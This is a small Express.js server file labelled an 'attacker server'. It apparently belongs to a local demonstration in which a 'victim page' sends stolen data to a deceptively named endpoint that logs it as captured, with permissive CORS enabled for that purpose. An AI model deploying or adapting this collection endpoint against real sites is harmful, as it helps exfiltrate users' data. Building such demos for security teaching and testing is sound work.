const express = require('express');
const app = express();
const port = 3002;

// Enable CORS manually to allow requests from the victim page
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

app.use(express.json());

app.post('/attacker-url-that-seems-trustworthy', (req, res) => {
    console.log('Captured data:', req.body);
    res.sendStatus(200);
});

app.listen(port, () => {
    console.log(`Attacker server listening at http://localhost:${port}`);
});
